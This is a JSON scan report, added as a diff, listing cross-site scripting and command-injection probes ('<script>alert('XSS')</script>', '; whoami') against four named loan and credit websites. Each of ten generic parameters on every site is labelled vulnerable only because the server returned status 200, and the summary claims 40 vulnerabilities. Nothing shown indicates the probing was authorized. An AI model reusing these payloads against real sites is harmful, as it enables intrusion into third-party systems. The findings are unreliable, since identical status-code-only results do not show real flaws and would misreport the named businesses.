@@ -1,0 +1,284 @@
+{
+  "scan_type": "Advanced Testing - New Targets",
+  "timestamp": "2025-10-28 10:49:07",
+  "results": [
+    {
+      "target": "http://www.moneythai.com",
+      "vulnerabilities": [
+        {
+          "parameter": "q",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "search",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "id",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "name",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "file",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "path",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "url",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "query",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "keyword",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        }
+      ],
+      "vulnerable": true,
+      "scan_time": "2025-10-28 10:48:39"
+    },
+    {
+      "target": "http://www.smarloan.com",
+      "vulnerabilities": [
+        {
+          "parameter": "q",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "search",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "id",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "name",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "file",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "path",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "url",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "redirect",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "query",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        },
+        {
+          "parameter": "keyword",
+          "payload": "; whoami",
+          "type": "Command Injection",
+          "status_code": 200
+        }
+      ],
+      "vulnerable": true,
+      "scan_time": "2025-10-28 10:49:02"
+    },
+    {
+      "target": "http://www.thailoan.com",
+      "vulnerabilities": [
+        {
+          "parameter": "q",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "search",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "id",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "name",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "file",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "path",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "url",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "query",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "keyword",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        }
+      ],
+      "vulnerable": true,
+      "scan_time": "2025-10-28 10:49:04"
+    },
+    {
+      "target": "http://www.thaicredit.com",
+      "vulnerabilities": [
+        {
+          "parameter": "q",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "search",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "id",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "name",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "file",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "path",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "url",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "redirect",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "query",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        },
+        {
+          "parameter": "keyword",
+          "payload": "<script>alert('XSS')</script>",
+          "type": "XSS",
+          "status_code": 200
+        }
+      ],
+      "vulnerable": true,
+      "scan_time": "2025-10-28 10:49:07"
+    }
+  ],
+  "summary": {
+    "total_targets": 4,
+    "vulnerable_targets": 4,
+    "total_vulnerabilities": 40,
+    "xss_vulnerabilities": 30,
+    "sql_injection": 0,
+    "command_injection": 10,
+    "file_inclusion": 0,
+    "ssrf": 0
+  }
+}
